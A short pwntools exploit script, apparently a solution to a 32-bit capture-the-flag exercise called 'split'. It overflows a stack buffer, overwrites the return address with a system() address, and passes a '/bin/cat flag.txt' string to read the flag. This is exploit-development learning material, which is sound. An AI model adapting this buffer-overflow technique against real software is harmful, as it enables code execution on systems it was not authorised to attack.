from pwn import * 
from pwn import p32
import socket

context(arch='i386')
context.terminal = ['tmux', 'splitw', '-h']
r = process("./split")

addr_system = 0x804a018
addrplt_system = 0x080483e0
data_string = 0x0804A030

payload = b'A'*0x28 + b"junk" + p32(addr_system)
# payload = b'A'*0x28 + b"junk" + p32(addrplt_system)
payload += b'junk'+ p32(0x0804A030)
r.sendlineafter(b">",payload)
r.interactive()

# addr system .plt_addr = 0x080483e0
#.data string '/bin/cat flag.txt' = 0x0804A030 

